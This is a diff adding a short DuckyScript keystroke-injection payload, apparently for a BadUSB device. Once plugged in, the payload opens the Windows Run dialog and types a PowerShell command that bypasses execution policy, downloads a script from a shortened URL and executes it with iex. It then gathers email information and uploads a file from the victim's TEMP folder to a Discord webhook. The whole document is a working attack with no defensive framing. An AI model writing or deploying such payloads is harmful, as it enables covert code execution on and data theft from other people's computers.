@@ -1,0 +1,6 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -NoP -Ep Bypass "irm 't.ly/3J__j'|iex;$filePath = Get-EmailInfo;Upload-Discord -webhookUrl 'YOUR DISCORD WEBHOOK' -file "$env:TEMP\CaliShot.png"
+DELAY 300
+ENTER
